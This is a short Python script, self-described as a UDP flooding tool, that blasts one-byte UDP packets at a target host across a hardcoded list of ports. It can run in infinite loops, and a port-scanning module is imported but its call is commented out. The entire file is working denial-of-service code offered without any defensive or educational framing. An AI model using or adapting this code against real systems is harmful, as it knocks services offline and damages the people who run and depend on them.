"""
UDP Flooding to fixed IP and Port
"""

import socket
import search
from random import randint


# Message is 1 byte
MESSAGE = bytes(1)
UDP_PORTS = ['1000', '1001', '1002', '1003', '1004']

def udp_flood(host, port, amount):
    sock = socket.socket(socket.AF_INET,  # Internet
                         socket.SOCK_DGRAM)  # UDP

    if amount == 0:
        while True:
            sock.sendto(MESSAGE, (host, port))
    else:
        for i in range(0, amount):
            sock.sendto(MESSAGE, (host, port))


def flood_host(host, amount):
    open_ports = UDP_PORTS # search.scan_udp_ports(host)
    length = len(open_ports)

    if length == 0:
        print("No UDP ports open")
        return  # MAYBE SLEEP AND TRY AGAIN
    while True:
        # Choose random port
        index = randint(0, length - 1)

        # If amount is 0, floods the first random port only
        try:
            udp_flood(host, int(open_ports[index]), amount)
        except:
            print("Cannot flood port", open_ports[index])